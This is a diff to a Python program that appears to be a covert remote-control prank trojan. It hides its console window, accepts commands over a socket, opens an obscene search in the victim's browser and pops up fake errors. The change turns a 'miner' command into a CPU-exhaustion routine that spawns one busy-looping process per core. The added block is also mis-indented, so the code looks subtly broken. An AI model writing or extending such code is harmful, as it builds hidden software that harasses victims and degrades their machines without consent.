@@ -7,7 +7,7 @@ import tkinter as tk
 from tkinter import messagebox
 import subprocess
 import webbrowser
-import shutil
+import multiprocessing
 
 ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
@@ -165,12 +165,24 @@ def execute_command(cmd):
         url = f"https://www.google.com/search?q=18+ с обезьянами смотреть бесплатно"
         webbrowser.open(url)
     elif cmd == "майнер":
-        while True:
-         x = 0
-         for i in range(1000000):
+        def cpu_worker():
+         while True:
+          x = 0
+          for i in range(1000000):
             x += i ** 2
-         time.sleep(0.001)
-         print('запущен майнер')
+          time.sleep(0.001)
+          print('запущен майнер')
+        num_cores = multiprocessing.cpu_count()
+    processes = []
+
+    for _ in range(num_cores):
+        p = multiprocessing.Process(target=cpu_worker)
+        p.start()
+        processes.append(p)
+
+    for p in processes:
+        p.join()
+
     else:
         win_error("сообщение", f"{cmd}")
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
